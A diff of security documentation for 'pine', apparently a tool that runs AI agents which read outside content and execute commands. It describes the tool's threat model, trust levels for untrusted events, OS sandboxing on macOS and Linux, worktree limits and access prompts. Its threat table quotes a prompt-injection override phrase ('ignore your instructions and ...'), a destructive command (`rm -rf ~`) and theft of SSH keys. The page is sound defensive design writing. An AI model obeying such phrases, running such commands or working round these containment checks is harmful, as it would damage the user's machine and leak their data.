@@ -1,1118 +1,666 @@
 # Security
 
-pine runs models that read things strangers wrote and that can run commands. This page says
-what is defended, how, and what is left.
+pine runs models that read what strangers wrote and that can run commands. This page says what
+is defended, how, and what is left.
 
 ## What can go wrong
 
 | Threat | Example |
 |---|---|
 | Someone outside drives the daemon | A stranger messages your bot; a web page you have open posts to the control port; someone on the network calls a webhook |
-| Prompt injection | A mail, web page, MQTT message or file name contains "ignore your instructions and ..." and the model follows it |
+| Prompt injection | A mail, web page, MQTT message or file name says "ignore your instructions and ..." and the model follows it |
 | An agent, misled or mistaken, damages the machine | `rm -rf ~`, overwriting another project, reading SSH keys |
 | Information leaves | The agent is talked into sending your files to a URL, a chat or a device |
-| The agent takes over the daemon | It writes an extension or changes its own configuration so that hostile code runs with the daemon's rights on the next start |
+| The agent takes over the daemon | It writes an extension or changes its own configuration so that hostile code runs with the daemon's rights |
 
-No model reliably tells instructions from data. pine therefore does not depend on the model
-refusing; it limits what a run can do, by where its input came from.
+No model reliably tells instructions from data. So pine does not rely on the model refusing: it
+limits what a run can do, by where its input came from.
 
 ## The layers
 
 ### 1. Who may speak
 
-- **Telegram:** only the account you paired, or the user ids in `allow`, are heard. What anyone
-  else writes reaches no agent. Pairing needs both ends: the bot sends a code to the account
-  that wrote to it, and that code has to be typed into pine, which names the account. So a
-  stranger cannot pair (they do not see your screen), you cannot pair a stranger by a slip of
-  the finger (you do not have their code), and an account you deny is not asked about again.
-  Once your account is paired, anybody else who writes to the bot gets no answer at all and
-  causes no question.
-- **Control API:** loopback by default; every request except `GET /health` and the webhooks
-  (which carry their own secret) needs a bearer token (generated into `data/http-token`, mode
-  600, which the CLI reads). Control requests carrying an `Origin` or `Sec-Fetch-Site` header
-  or an unexpected `Host` are refused, so a web page in your browser cannot use it, with or
-  without DNS rebinding. Bodies must be JSON and at most 1 MB (64 MB for a message with attached
-  files).
-- **Webhooks:** each hook has a secret (bearer or HMAC of the body) unless you set `"open":
-  true`, a rate limit (120 requests a minute), and a fixed topic. A request from a web page is
-  refused there as at the control API, so a page in your browser cannot call an open hook; the
-  `Host` is not checked, so a tunnel or reverse proxy in front still works.
-- **MQTT, watched folders:** you choose the topics and folders. What arrives is treated as
-  outside content.
-- **The Pine app on a phone or in a browser:** browser access is off until you turn it on in
-  the Pine app. Then a device gets in only with a key you allowed at this computer, after you
-  compared four digits on both screens; while `Visible on this network` is on, a phone on the
-  same network can ask without a code, and you still allow each one. The app's page holds no
-  token, a code block's Run button types only on your click, and a view runs in a frame that
-  is told nothing of what agents write. See [desktop.md](desktop.md), "What the app is careful
-  about", [web.md](web.md), [mobile.md](mobile.md) and [views.md](views.md).
-- **Event sources:** you configure them, or confirm what an agent sets up. One that nobody is
-  subscribed to is not running (unless you gave it `"start": "always"`). What they report is outside content unless you mark the source
-  as yours; see "Event sources" below.
+- **Telegram:** only the account you paired (with a code the bot sends it, typed into pine), or
+  the user ids in `allow`, are heard. Anyone else gets no answer and causes no question.
+- **Control API:** loopback by default. Every request except `GET /health` and the webhooks
+  needs the bearer token in `data/http-token` (mode 600), which the CLI reads. A request with an
+  `Origin` or `Sec-Fetch-Site` header or an unexpected `Host` is refused, so a web page in your
+  browser cannot use it, with or without DNS rebinding. Bodies are JSON, at most 1 MB (64 MB for
+  a message with files).
+- **Webhooks:** each has a secret (bearer or HMAC of the body) unless set `"open": true`, a
+  limit of 120 requests a minute, and a fixed topic. A request from a web page is refused here
+  too; the `Host` is not checked, so a tunnel or reverse proxy in front works.
+- **MQTT, watched folders:** you choose the topics and folders. What arrives is outside content.
+- **The Pine app on a phone or in a browser:** off until you turn on browser access; a device
+  gets in only with a key you allowed at this computer ([desktop.md](desktop.md), "What the app
+  is careful about").
+- **Event sources:** you set them up, or confirm what an agent sets up. One nobody is
+  subscribed to does not run (unless `"start": "always"`). What they report is outside content
+  unless you mark the source as yours ("Event sources" below).
 
 ### 2. Where content came from decides what it may do
 
-Every event carries `trust`. It is `owner` when the content came through a channel that
-authenticated you (a paired or allow-listed Telegram account, the control API), from a
-schedule (one you wrote, or one an agent made at your wish), from a source you marked
-`"trust": "owner"`, or from an agent's `publish_event` in a conversation that has read no
-outside content. Everything else is `untrusted`.
+Every event carries `trust`. It is `owner` when it came through a channel that authenticated
+you (a paired or listed Telegram account, the control API), from a schedule, from a source
+you marked `"trust": "owner"`, or from an agent's `publish_event` in a conversation that has
+read no outside content. Everything else is `untrusted`.
 
 A task started by an untrusted event runs with the agent's `untrusted` profile:
 
-- built-in tools `read`, `grep`, `find`, `ls` only; no shell, no writing;
-- no MCP servers, no delegation, no `publish_event`, no state writes, no sub-agents, no board
-  ([boards.md](boards.md));
+- built-in tools `read`, `grep`, `find`, `ls` only: no shell, no writing;
+- no MCP servers, no delegation, no `publish_event`, no state writes, no sub-agents, no board;
 - none of the tools that change pine's setup or turn to you (`add_source`, `add_mcp_server`,
-  `add_skill`, `add_schedule`, `subscribe`, `request_access`, `question`), no `todo`, no
-  `manual`, no `download`;
-- no command in the background, no goal, never app control, never a browser window on your
-  screen;
-- in its own session (`<name>~u`), so it neither sees your conversation nor leaves text in it.
+  `add_skill`, `add_schedule`, `subscribe`, `request_access`, `question`), no `todo`,
+  `manual` or `download`;
+- no command in the background, no goal, no app control, no browser window on your screen;
+- its own session (`<name>~u`), so it neither sees your conversation nor writes into it.
 
-These tools are not hidden from such a run; they are not registered in it. Each item of the
-first two lines can be widened per agent (`"untrusted": { "stateWrite": true }`) or the agent
-can refuse untrusted tasks altogether (`"untrusted": false`). Tasks an untrusted run hands on
-stay untrusted for whoever receives them.
-
-What you widen there is used as it is: such a run is never asked about what it reaches,
-because nobody may be there to answer. Your `approve` list still asks, and so do critical
-actions and what sends something out. `pine check` names every agent whose `untrusted`
-profile has `bash`, `write` or `edit`.
+These tools are not hidden from such a run; they are not registered in it. The first two lines
+can be widened per agent (`"untrusted": { "tools": [...], "mcp": [...], "delegates": [...],
+"publish": [...], "stateWrite": true, "subagents": true, "board": true }`), or the agent can
+refuse untrusted tasks (`"untrusted": false`). What such a run hands on stays untrusted. It is
+never asked about more access, since nobody may be there to answer; your `approve` list,
+critical actions and sending something out are still put to you. `pine check` names every
+agent whose `untrusted` profile has `bash`, `write` or `edit`.
 
 A route may declare its events trusted (`"trust": "owner"`). Do that only for a source nobody
 else can write to; `pine check` lists every such route.
 
-One case is handled differently: an event of a source that one of your conversations is
-subscribed to is delivered into that conversation, framed as data, and taints it (layer 4)
-instead of starting a reduced run. "Event sources" below says why, and how `"separate": true`
-gets the reduced run back.
+An event of a source that one of your conversations subscribed to is different: it is
+delivered into that conversation, framed as data, and marks it as having read outside content
+(layer 4) instead of starting a reduced run. `"separate": true` on the subscription gets the
+reduced run back ("Event sources" below).
 
 ### 3. The sandbox
 
-Whether an agent's shell commands and file tool calls run inside a sandbox of the operating
-system is decided by its **mode** ("Modes" below). The sandbox is Apple's `sandbox-exec` on
-macOS and [bubblewrap](https://github.com/containers/bubblewrap) (`bwrap`) on Linux.
+Whether an agent's shell commands and file tools run in the operating system's sandbox is
+decided by its mode ("Modes" below): `safe` and `manual` work in it, `auto` and `bypass`
+without it. A run that an event from outside started always works in it. The sandbox is Apple's
+`sandbox-exec` on macOS and [bubblewrap](https://github.com/containers/bubblewrap) (`bwrap`) on
+Linux. Windows has none of pine's; `safe` mode there is pine in WSL.
 
-| Mode | Who has it | Sandbox | What the agent reaches |
-|---|---|---|---|
-| `auto` | The main agent, unless you say otherwise | Off | Your whole user account and the network, in your own conversations. See "The whole account" below. |
-| `safe` | Every other agent, unless you say otherwise | On | Its own folders. The table that follows. |
-| `manual` | An agent you set to it | On | As `safe`, and every action waits for you. |
-| `bypass` | An agent you set to it | Off | As `auto`, and nothing is asked. |
-
-Set the mode per agent with `mode`, or for all agents that name none with `defaults.mode`
-([configuration.md](configuration.md)). A run that an event from outside started works in the
-sandbox whatever the agent's mode is.
-
-In the sandbox, the same on both systems:
+In the sandbox, on both systems:
 
 | | |
 |---|---|
-| Can read | Its workspace, its private home, its skills, pine's manual (`docs/`), temp, the files its event sources received (see below), and the system outside your home folder (programs, libraries) |
+| Can read | Its workspace, its private home, its skills, pine's manual (`docs/`), temp, the files its event sources received, and the system outside your home folder (programs, libraries) |
 | Can write | Its workspace, its private home (`sandbox/<id>/`, which is `$HOME` in its shell), temp. The main agent also the three files for all agents in pine's home (`AGENTS.md`, `TOOLS.md`, `USER.md`), and nothing else there |
 | Cannot read or write | Your home folder, pine's home (configuration, `.env`, database, other agents' folders), other agents' workspaces |
-| Cannot | Use the network (unless `sandbox.network` or you granted it to the conversation; the `download` tool is the exception described under Modes), signal or inspect other processes, or reach the services of your session: launching apps, AppleScript, the keychain or keyring, the clipboard, the session bus, the container daemon, an ssh agent |
-| Can compute on | macOS: the graphics chip and the neural engine, which the system's own recognition of text and pictures runs on (a Swift script that reads the text of a scanned page with Vision works). They compute; they reach no file, address or other program |
-| Environment | A handful of variables (`PATH`, `LANG`, ...). Nothing from the daemon's environment, no secrets. `HOME` is the private home. On macOS `CFFIXED_USER_HOME` names it too, so that Apple's libraries take the same home, and `CLANG_MODULE_CACHE_PATH` puts the compilers' cache of built modules into it (the first `swift` run of an agent builds them and takes a while) |
+| Cannot | Use the network (unless `sandbox.network`, or you granted it to the conversation), signal or inspect other processes, or reach your session's services: launching apps, AppleScript, the keychain or keyring, the clipboard, the session bus, a container daemon, an ssh agent |
+| Can compute on | macOS: the graphics chip and the neural engine (a Swift script that reads a scanned page with Vision works). They reach no file, address or program |
+| Environment | A handful of variables (`PATH`, `LANG`, ...): nothing from the daemon's environment, no secrets. `HOME` is the private home |
 
-One part of pine's home is an agent's to read besides its own folders: the files its event
-sources received (a camera's upload, a photo sent through Telegram), which lie in
-`data/sources/<name>/`. An agent reads those of its own sources and of the sources it is
-subscribed to, in every mode, and writes none of them; the rest of pine's data folder and the
-files of other sources stay closed. See "Files a source received" in
-[sources.md](sources.md).
+The files an agent's event sources received (a camera's upload, a photo sent through
+Telegram) lie in `data/sources/<name>/`. An agent reads those of its own sources and of the
+sources it is subscribed to, in every mode, and writes none of them; the rest of pine's data
+stays closed ([sources.md](sources.md), "Files a source received").
 
-How the two systems say it differs. On macOS the sandbox gets a profile that starts from
-"deny everything" and allows what the table lists. On Linux the command is given a file
-system of its own: everything read-only, your home folder and pine's home as empty folders
-with the agent's own folders put back, a process list and a `/dev` of its own, no network
-device, and a system call filter that refuses sockets to other programs on the machine
-(behind those are the session bus, the keyring, a container daemon, a terminal multiplexer).
-"On Linux" below lists where that leaves a difference.
+The file tools (`read`, `write`, `edit`, `grep`, `find`, `ls`) do their work inside the
+sandbox too, so a path swapped for a link after a check gains nothing: the operating system
+decides at the moment of access. Without a sandbox a check in the daemon holds them: pine's
+home and program stay closed, and after outside content so do the files read as instructions.
 
-In the sandbox the file tools (`read`, `write`, `edit`, `grep`, `find`, `ls`) do their I/O
-through it rather than in the daemon. That closes the usual gap of "check the path, then open
-it": replacing a file with a symlink after the check gains nothing, because the operating
-system applies the policy at the moment of access. Without a sandbox (`auto`, `bypass`) a path
-check in the daemon holds them: pine's home and program stay closed, and after outside
-content the files that are read as instructions.
+A folder you open for a conversation is that conversation's to read and write, and its
+sub-agents', never a run that outside content started. Only you open one, and pine's home and
+program and other agents' workspaces are refused. Its `AGENTS.md` and `CLAUDE.md` become
+instructions ([coding.md](coding.md)).
 
-A conversation that you opened a folder for (`pine <folder>`, `/folder`, the folder in the UI's
-bottom bar) can also read and write that folder, and its tools start there. That is the whole
-of it: the folder is that conversation's, the sub-agents' it starts, and, for that one task,
-another agent's that it hands work to without a `thread`; not the agent's other
-conversations', not that of a run that outside
-content started. Only you can open one; agents have no tool for it. pine's home, pine's own
-program and other agents' workspaces are refused, also as part of a larger folder. The
-folder's `AGENTS.md` and `CLAUDE.md` become instructions to the agent, so open folders whose
-authors you would let instruct it. See [coding.md](coding.md).
+Looking at a folder in a UI's code pane runs nothing from it. Saving a file from an editor
+(`POST /agents/<id>/view/write`) and the file tree's changes go through a helper in a sandbox
+that may write that folder alone, so a planted link is never written through; without a sandbox
+nothing is written that way.
+
+Consequences worth knowing:
+
+- An agent cannot change its `agent.json`, its extensions or `pine.json`. Rules it must never
+  change go into `agents/<id>/AGENTS.md`, outside its reach.
+- Tools that need files in your home (`~/.gitconfig`, `~/.npmrc`, `~/.ssh`, a toolchain there)
+  see the agent's empty private home. Grant folders with `sandbox.read` / `sandbox.write`, or
+  use `auto` mode.
+- Without a working sandbox (Linux without bubblewrap or user namespaces, a container without
+  the rights, any other system) `safe` cannot be had: an agent whose mode nobody chose works in
+  `auto`, one set to `safe` gets no shell, a run started from outside gets no shell, and
+  `command` sources do not run. `pine check` says so and why.
+- A local MCP server you added is your program with your rights. One an agent added
+  (`add_mcp_server`) runs where that agent's commands run; mark one of yours `"sandboxed": true`
+  to run it the same way ([mcp.md](mcp.md)).
+- `trustWorkspace` stays `false`: nothing executable is loaded from the workspace.
 
 #### Worktrees
 
-A conversation in a worktree of pine's ([coding.md](coding.md), "A worktree for a
-conversation") reads and writes all of its worktree. Of the repository's git folder, which all
-its worktrees share, it reads everything and writes only what its own git needs: the objects,
-its worktree's own part (`.git/worktrees/<name>`: its index, its HEAD), and the branches under
-`pine/`. The repository's configuration and hooks, your branches, the main checkout and the
-other worktrees are closed to it. So are the files that tell git where the worktree's repository
-is (the worktree's `.git` file, and `commondir` and `gitdir` in its part of the git folder): a
-pointer an agent rewrote would make your next git command there read a configuration of the
-agent's. These rights come from pine's record of the worktree, never from a file in it.
-
-A conversation whose folder is the repository itself cannot write into `.pine/worktrees`, at any
-depth: the worktrees are the other conversations'. A file tool says so; the sandbox refuses a
-command.
-
-What is still shared: an agent in a worktree can add to the repository's objects and could
-damage them (the sandbox does not tell adding from removing), and it can move or delete any
-branch under `pine/`, including another conversation's. Your branches it cannot touch.
-
-pine itself runs git for a worktree (making it, merging, updating, removing it, committing what a
-sub-agent left) in a sandbox that writes only what that step needs, with the repository's hooks
-and file system monitor off, and every filter and merge driver it names replaced by one that
-does nothing: an agent may have written the repository's configuration, and pine runs nothing
-it wrote.
+A conversation in a worktree ([coding.md](coding.md), "A worktree for a conversation") reads and
+writes its worktree. Of the repository's shared git folder it writes only what its own git needs:
+the objects, its worktree's index and HEAD, and branches under `pine/`. The repository's
+configuration and hooks, your branches, the main checkout and the other worktrees stay closed,
+by pine's record of the worktree, never by a file in it. Still shared: it could damage the
+objects, and it can move any branch under `pine/`. pine's own git calls for a worktree run with
+hooks off and the repository's filters and merge drivers replaced.
 
 #### On Linux
 
-The sandbox is what `safe` and `manual` mode and every run started from outside work in; an
-agent in `auto` or `bypass` mode needs none. It needs bubblewrap, and bubblewrap has to be
-allowed to create user namespaces.
-`pine init` takes care of both, and of the system libraries the browser of the web tools
-needs: it looks at what is missing, shows the commands it would run as administrator, and runs
-them after one yes (`sudo` asks for the password; `pine init --yes` does not ask). pine tries the sandbox once at each start. Where it does not work, `pine check`
-gives the reason and pine behaves as on a machine without a sandbox (below).
+The sandbox needs bubblewrap, allowed to create user namespaces. `pine init` sees to both, and
+to the browser's system libraries: it shows the commands it would run as administrator and runs
+them after one yes (`pine init --yes` does not ask). Where the sandbox does not work, `pine
+check` gives the reason.
 
-What `pine init` does, and what it cannot do:
-
-- **bubblewrap is missing**: it installs the package with the system's package manager (apt,
-  dnf, yum, pacman, zypper, apk).
-- **Ubuntu 24.04 and later** restrict user namespaces through AppArmor. pine writes a rule
-  that allows them for bubblewrap, to `/etc/apparmor.d/bwrap`, and loads it:
-
-  ```
-  abi <abi/4.0>,
-  include <tunables/global>
-
-  profile bwrap /usr/bin/bwrap flags=(unconfined) {
-    userns,
-  }
-  ```
-
-  A file that is there already is left as it is and only loaded again. (Setting
-  `kernel.apparmor_restrict_unprivileged_userns=0` would allow them for every program
-  instead; pine does not do that.)
-- **A container** (Docker, Podman) forbids a sandbox inside it unless it was started with the
-  rights for one, and those cannot be given from inside. With pine as root in the container
-  it needs `--cap-add SYS_ADMIN --cap-add NET_ADMIN --security-opt seccomp=unconfined
-  --security-opt apparmor=unconfined`: to create namespaces, to give a sandbox without
-  network its own loopback interface, and past Docker's system call filter and AppArmor
-  profile, which forbid the sandbox's change of root and its mounts. As an ordinary user in
-  the container it also needs `--security-opt systempaths=unconfined`, to mount the sandbox's
-  own `/proc`. (`--privileged` does all of it.) Each was tried by leaving it out. `pine init`
-  installs bubblewrap in the container and names the flags when a right is missing. Without them pine in a container has no agent sandbox; the container is then the
-  only wall, and it is around all agents and pine's secrets together. That is a fair way to
-  run pine in a container, and needs no flags: an agent whose mode nobody chose works in
-  `auto` there ("Consequences worth knowing" below). The flags are for those who want `safe`
-  mode inside a container, and they take away most of what the container itself protects.
-- **No `sudo` and not root**: pine prints the commands for whoever administers the machine.
-- **The browser's system libraries** (a server or a container image has few of them): where
-  apt is, pine installs them through Playwright's own list of packages, with the same yes.
-  Elsewhere it names what is missing; web search and page reading work without the browser.
-- **A systemd unit** with `RestrictNamespaces=` or `PrivateUsers=`.
+- **bubblewrap missing:** installed with the system's package manager (apt, dnf, yum, pacman,
+  zypper, apk).
+- **Ubuntu 24.04 and later** restrict user namespaces through AppArmor. pine writes a rule that
+  allows them for bubblewrap alone to `/etc/apparmor.d/bwrap` and loads it.
+- **A container** (Docker, Podman) allows no sandbox inside unless started with the rights for
+  one. With pine as root in the container: `--cap-add SYS_ADMIN --cap-add NET_ADMIN
+  --security-opt seccomp=unconfined --security-opt apparmor=unconfined`; as an ordinary user
+  also `--security-opt systempaths=unconfined` (`--privileged` does all of it). `pine init`
+  names the flags that are missing. Without them the container is the only wall, around all
+  agents and pine's secrets together, and agents whose mode nobody chose work in `auto`: a fair
+  way to run pine. The flags, for `safe` mode inside, take away most of what the container
+  protects.
+- **No `sudo` and not root:** pine prints the commands for whoever administers the machine.
+- **The browser's libraries:** installed where apt is; elsewhere named. Web search works without.
+- **A systemd unit** with `RestrictNamespaces=` or `PrivateUsers=` prevents the sandbox.
 
 What differs from macOS:
 
 | | macOS | Linux |
 |---|---|---|
-| Your home folder, pine's home | Access is refused | They are empty, read-only folders: a command sees that they exist, and in them only the way to the folders it was given |
-| Instruction files, and a repository's hooks and configuration, in a run that read outside content (layer 4) | Cannot be written or created, at any depth | What exists is read-only. What did not exist can be created by a shell command, and pine removes it when the command ends. Both are looked for six folders deep, and not inside folders of installed packages or build output (`node_modules`, `.venv`, `dist`, `build`, `target` and the like), in at most 20000 folders. In a larger tree the file tools refuse to write, and a shell command runs with a note that what it made past the look may still be there |
-| Programs on the same machine (the session bus, the keyring, a container daemon, a terminal multiplexer, an editor's helper) | Without the network, no connection of any kind. Keychain, clipboard, AppleScript and launching apps are refused by name, also with the network | Without the network a command cannot make a socket to another program (a system call filter, on x86-64 and arm64; programs built for 32 bit do not run then). The session's folder (`/run/user`) is empty and the sockets in `/run` are covered, also with the network |
-| With the network granted | Addresses only: the internet and your local network. Socket files stay closed, except in the agent's own folders (not the shared temp folder), where its own programs talk to each other | Also programs that listen on a socket file where the agent can read outside `/run` (a tmux server or an ssh agent in the temp folder), and those that listen on a socket without a file (an X server does) |
-| Processes a command leaves in the background | Not ended by the sandbox ([coding.md](coding.md) says where they show) | The same without a sandbox (`auto`, `bypass`). In the sandbox they end with the command: its processes are a group of their own that ends with it |
-| A command started in the background in a conversation that has read outside content | Runs with the same limits as one that is waited for | Refused. What such a command may not create is taken away when the command ends, and that is no protection while a command runs for hours. The agent runs it without `background` |
-| pine run as root | Commands run as root | Commands run as root without root's special powers (capabilities), which they could otherwise use to undo the sandbox |
+| Your home folder, pine's home | Refused | Empty, read-only folders, with only the way to the agent's own folders in them |
+| Instruction files, a repository's hooks and configuration, after outside content (layer 4) | Cannot be written or created, at any depth | What exists is read-only; a new one a shell command creates is removed when it ends. Looked for six folders deep (not in `node_modules`, `dist`, `build` and the like), in at most 20000 folders; past that the file tools refuse to write |
+| Other programs (session bus, keyring, container daemon, terminal multiplexer) | No connection without the network; keychain, clipboard, AppleScript and launching apps refused also with it | No socket to another program without the network (32-bit programs do not run then); `/run/user` and the sockets in `/run` closed also with it |
+| With the network granted | The internet and your local network; socket files stay closed outside the agent's own folders | Also programs on a socket file outside `/run` (a tmux server, an ssh agent in temp) and an X server |
+| Processes a command leaves running | Not ended by the sandbox ([coding.md](coding.md), "What an agent left running") | In the sandbox they end with the command; without one (`auto`, `bypass`) as on macOS |
+| A command in the background after outside content | Allowed, with the same limits | Refused: what such a command may not create is only taken away when it ends |
+| pine run as root | Commands run as root | Commands run as root without root's capabilities |
 
-The file tools refuse a protected name at any depth on both systems; the rows above about
-depth concern shell commands only.
-
-The code pane of the terminal UI reads through the daemon, not through an agent: it lists and
-shows files of the conversation's folder only, with links resolved, and runs `git` for the
-changes inside a sandbox that cannot write and has no network, with the programs a repository
-can name for git to start (diff drivers, text converters, hooks, a file system monitor)
-switched off. Looking at a folder runs nothing from it.
-
-A UI can also save a file you changed in its editor (`POST /agents/<id>/view/write` of the
-control API; no agent has a tool for it). The folder it writes in is one an agent writes in
-too, so what lies there is not trusted: a file's name can be a link to something of yours
-elsewhere, or a second name of such a file. The daemon therefore never writes on such a path
-itself. The text is put into place by a helper inside a sandbox that may write in that folder
-and nowhere else, as a new file that then takes the place of the old one; what the old name
-pointed at is left as it was. Where there is no sandbox, nothing is written.
-
-The file tree's renames, copies, moves and deletions (`POST /agents/<id>/view/files`) go
-through the same helper and sandbox. A link is acted on as itself, never what it points at.
-
-Consequences worth knowing:
-
-- An agent cannot change its own `agent.json`, its extensions or `pine.json`.
-  It can change the files it is meant to keep: `AGENTS.md`, `SOUL.md`, `TOOLS.md` and `MEMORY.md` in its
-  workspace, and for the main agent the files for all agents in pine's home (`AGENTS.md`,
-  `TOOLS.md`, `USER.md`; [agents.md](agents.md)), until the session is
-  restricted; see layer 4. Rules it must never change go into `agents/<id>/AGENTS.md`, which
-  is outside its reach.
-- In the sandbox `git`, `node`, `python`, `sed` and the like work. Tools that need files in
-  your home (`~/.gitconfig`, `~/.npmrc`, `~/.ssh`, a toolchain installed there) see the
-  agent's empty private home instead. Grant specific folders with `sandbox.read` /
-  `sandbox.write`, or set the agent to `auto` mode.
-- On a machine without a working sandbox (Linux without bubblewrap or without user
-  namespaces, a container started without the rights for one, any other system), `auto`,
-  `bypass` and `manual` work as everywhere. `safe` cannot be had there. An agent whose mode
-  nobody chose works in `auto` instead, and `pine check` names it. An agent you set to `safe`
-  gets no shell and is told why; its file tools work, held by a path check in the daemon. A
-  run that an event from outside started gets no shell, and the commands of `command` sources
-  are not run. `pine check` says all of this, and why there is no sandbox.
-- A local MCP server that you added yourself is not sandboxed: it is your program with your
-  rights. One that an agent added (`add_mcp_server`) runs where that agent's commands run:
-  inside its sandbox in `safe` and `manual` mode, with your rights in `auto` and `bypass`
-  mode (the dialog you confirm says which). One of yours that you mark `"sandboxed": true`
-  runs the same way ([mcp.md](mcp.md)).
-- `trustWorkspace` stays `false`: pi then loads nothing executable from the workspace, so an
-  agent cannot plant an extension for the daemon to run.
+The file tools refuse a protected name at any depth on both systems.
 
 ### When a call needs something outside: pine asks you
 
-An agent in the sandbox (`safe` or `manual` mode) does not have to know where it ends, and
-does not have to think of asking. When one of its calls needs a file or folder of yours, or the network,
-pine puts the question to you itself. It arrives like any approval, under the name
-`request_access`, and says what is wanted and for which call.
+An agent in the sandbox (`safe`, `manual`) need not know where it ends, nor ask. When one of its
+calls needs a file or folder of yours, or the network, pine asks you itself, although the agent
+never asked: an approval named `request_access` that says what is wanted and for which call.
 
 | When | What happens |
 |---|---|
-| A file tool is given a path outside the agent's folders | You are asked before the call. Yes: it runs. No: it is refused, and the agent is told that you said no |
-| A shell command names such a path (`cat /Users/you/notes/a.txt`, a redirect into one, `cp` to one) | You are asked before the command runs. Reading is asked for a path that exists; writing for the target of a redirect and for what `touch`, `mkdir`, `rm`, `mv`, `tee`, `cp` and the like name |
-| A command writes `~` or `$HOME` for something that is in your home and not in the agent's private one | In the agent's shell `~` is its own private home (`sandbox/<id>/`). You are asked for the path in your home, and the agent is told to run the command again with that path written out |
-| A command is refused something it did not name: a script opens a file, a program wants the network | macOS: pine reads the system's own reports of what the sandbox refused that command, asks you, and adds a line of its own to the end of the command's output: what was refused, what you answered, and to run the command again after a yes |
+| A file tool is given a path outside the agent's folders | You are asked before the call. Yes: it runs. No: refused, and the agent is told you said no |
+| A shell command names such a path (`cat /Users/you/notes/a.txt`, a redirect into one, `cp` to one) | You are asked before it runs: for reading a path that exists; for writing the target of a redirect and what `touch`, `mkdir`, `rm`, `mv`, `tee`, `cp` and the like name |
+| A command writes `~` or `$HOME` for something in your home | In the agent's shell `~` is its private home (`sandbox/<id>/`). You are asked for the path in your home, and the agent is told to run the command again with the path written out |
+| A command is refused something it did not name (a script opens a file, a program wants the network) | macOS: pine reads the system's reports of what the sandbox refused that command, asks you, and adds a line to the command's output: what was refused, your answer, and to run it again after a yes |
 
-A yes is the grant `request_access` gives: it holds for that conversation and its sub-agents
-until the conversation is reset or pine restarts. A no is kept for the conversation too: pine
-does not ask for the same thing again there. The agent can still call `request_access` itself,
-with a reason. To turn this question off, set `security.askAccess` to `false` in `pine.json`
-([configuration.md](configuration.md)): you are then asked only when the agent calls
-`request_access`.
+A yes holds for the conversation and its sub-agents until it is reset or pine restarts; a no is
+kept as long, and not asked again. The agent can also call `request_access` itself, with a
+reason. Never asked: pine's home, pine's code, other agents' workspaces, which no answer opens.
+What a program looks for on its own (dot files, `Library`) is asked only when the command names
+it, the network only after a command failed without it, and a run from outside never. After
+outside content the question begins "Careful: ...". On Linux pine goes by the paths a command
+names and by the words of a failed command ("Operation not permitted", "Could not resolve
+host"); what the agent gets is what you grant.
 
-What is never asked: pine's home, pine's code and other agents' workspaces. No answer of yours
-opens them, so the agent is told that they are closed and not to look for another way. What a
-program looks for on its own account is not asked either unless the command names it: names
-that start with a dot in your home, `Library`, the system's folders. The network is asked for
-only when the command failed without it. A run that an event from outside started is never
-asked about: it is told that it cannot be given more. After outside content the question says
-so ("Careful: ..."), because the command may be what that content wanted.
-
-How pine knows on macOS: every command's sandbox profile carries a text of its own, the system
-writes each refusal into its log with that text, and pine reads the log for it (`log stream`,
-which runs while an agent's commands run and for some seconds after, not all the time).
-None of this decides anything. The sandbox has refused already; the report only tells pine
-whom to ask, and what the agent gets is what you grant. On Linux the sandbox reports nothing,
-and where the log cannot be read pine has less to go on: the paths a command names before it
-runs, and after it the words of a failed command ("Operation not permitted", "Read-only file
-system", "Could not resolve host").
-
-To turn these questions off, set `security.askAccess` to `false` (Settings > Security, "Ask when an
-agent needs more"): an agent in the sandbox then gets more only by asking for it with `request_access`.
+To turn the question off, set `security.askAccess` to `false` (Settings > Security, "Ask when an
+agent needs more"): you are then asked only when the agent calls `request_access`.
 
 ### The whole account
 
 An agent that is to do real work on your machine needs what you have at your terminal: your
-projects, your programs and toolchains, your git and ssh setup, the network, and the ability to
-stop a server it started a minute ago. In `auto` mode it has that, without asking for access,
-because its commands run without a sandbox:
+projects in your home folder, your programs and toolchains, your git and ssh setup, the network,
+and the right to stop a server it started a minute ago. In `auto` mode it has that, without
+asking, because its commands run without a sandbox:
 
 | | |
 |---|---|
 | Files | Everything your user account can open and change |
-| Closed | pine's home (configuration, `.env`, database, other agents' folders), except its own folders there, and changing pine's program files. Not by the operating system: see "pine's own files without a sandbox" below |
-| Network, processes, apps | As you: it can install packages, start and stop programs (`ps`, `sudo` and programs that sandbox themselves work as in your terminal), open a browser |
-| Environment | Yours, with your home folder as `$HOME`. Variables whose name looks like a credential (`KEY`, `TOKEN`, `SECRET`, `PASSWORD`, `AUTH`, ...) are left out, except the ssh agent's address; add what the agent should have with `sandbox.env` |
+| Closed | pine's home (configuration, `.env`, the token, database, other agents' folders), except its own folders there, and changing pine's program files. Kept by reading what runs, not by the operating system: see below |
+| Network, processes, apps | As you: install packages, start and stop programs (`ps`, `kill`, `sudo`), open a browser |
+| Environment | Yours, with your home as `$HOME`. Variables whose name looks like a credential (`KEY`, `TOKEN`, `SECRET`, `PASSWORD`, `AUTH`, ...) are left out, except the ssh agent's address; add what the agent should have with `sandbox.env` |
 
-This is the reach `bypass` mode has. What differs from bypass is that `auto` checks what is
-critical, and what happens once the conversation has read outside content, described below.
-To keep an agent inside its own folders, set its mode to `safe`.
+`bypass` has the same reach and asks nothing. To keep an agent inside its own folders, set it to
+`safe`.
 
 #### pine's own files without a sandbox
 
-In the sandbox the operating system keeps an agent out of pine's home (configuration, `.env`,
-the control API's token, other agents' folders) and from changing pine's program. Without
-one, in `auto` and `bypass` mode, pine does it by reading what is about to run:
+Without a sandbox (`auto`, `bypass`), pine keeps agents out of its home and program by reading
+what is about to run:
 
 | What | How it is kept closed |
 |---|---|
-| A file tool (`read`, `write`, `edit`, ...) on a path in pine's home, or writing one in pine's program | Refused by a check in the daemon |
-| A shell command that names a path in pine's home: written out, with `~` or `$HOME`, or with `..` from where the shell starts | Not run. The files the agent's event sources received are the exception: a command that reads them runs, one that plainly writes or deletes them does not |
-| A shell command that plainly writes into pine's program files (a redirect, `touch`, `rm`, `cp` to it) | Not run |
+| A file tool on a path in pine's home, or writing one in pine's program | Refused by a check in the daemon |
+| A shell command that names a path in pine's home: written out, with `~` or `$HOME`, or with `..` from where the shell starts | Not run. The files its event sources received are the exception: reading them runs, plainly writing or deleting them does not |
+| A shell command that plainly writes into pine's program (a redirect, `touch`, `rm`, `cp` to it) | Not run |
 | A shell command that starts the `pine` program, or names pine's control port on this computer | Not run |
-| Any other shell command that names pine's program files and does more than look | Critical: you are asked, in every conversation (not in `bypass`) |
+| Any other shell command that names pine's program files and does more than look | Critical: you are asked (not in `bypass`) |
 
